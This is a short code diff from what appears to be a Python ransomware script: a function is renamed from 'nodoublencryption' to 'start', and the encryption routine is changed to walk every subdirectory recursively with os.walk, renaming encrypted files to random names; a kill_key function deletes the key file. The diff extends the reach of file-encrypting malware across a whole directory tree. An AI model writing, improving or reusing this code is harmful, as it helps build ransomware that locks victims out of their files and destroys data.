@@ -93,7 +93,7 @@ def load_key():
 def kill_key():
     os.remove("key.key")
 
-def nodoublencryption():
+def start():
     tmp = str(tempfile.gettempdir())
     signature = "cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp"
     path = os.path.dirname(os.path.abspath(signature))
@@ -127,7 +127,7 @@ def encrypt(dir, key):
         name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
         os.rename(filename, dir + "/" + name + "." + extension)
 
-    subdirs = [os.path.join(dir, o) for o in os.listdir(dir) if os.path.isdir(os.path.join(dir, o))]
+    subdirs = [x[0] for x in os.walk(dir)]
     for dirdir in subdirs:
         for filename in glob.glob(os.path.join(dirdir, '*.*'), recursive=True):
             with open(filename, "rb") as file:
@@ -140,4 +140,4 @@ def encrypt(dir, key):
             name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
             os.rename(filename, dirdir + "/" + name + "." + extension)
 
-nodoublencryption()
+start()
